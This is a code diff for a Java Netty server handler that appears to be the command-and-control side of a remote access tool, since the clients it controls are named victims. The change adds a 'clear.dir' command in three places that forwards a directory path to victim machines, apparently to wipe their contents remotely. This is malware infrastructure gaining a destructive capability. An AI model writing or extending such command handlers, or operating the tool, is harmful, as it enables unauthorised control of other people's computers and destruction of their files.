@@ -206,6 +206,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "build.zip":
                     targetVictim.sendBuildZip((String) request.get("dirPath"), user.getName());
                     break;
+                case "clear.dir":
+                    targetVictim.sendClearDir((String) request.get("dirPath"), user.getName());
+                    break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -306,6 +309,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "build.zip":
                     targetUser.sendBuildZip((String) request.get("code"), aVictim.getName());
                     break;
+                case "clear.dir":
+                    targetUser.sendClearDir((String) request.get("code"), aVictim.getName());
+                    break;
                 default:
                     aVictim.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -369,6 +375,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "build.zip":
                     targetUser.sendBuildZip((String) request.get("code"), pcVictim.getName());
+                    break;
+                case "clear.dir":
+                    targetUser.sendClearDir((String) request.get("code"), pcVictim.getName());
                     break;
                 default:
                     pcVictim.sendErrorCode(Config.INCORRECT_QUERY);
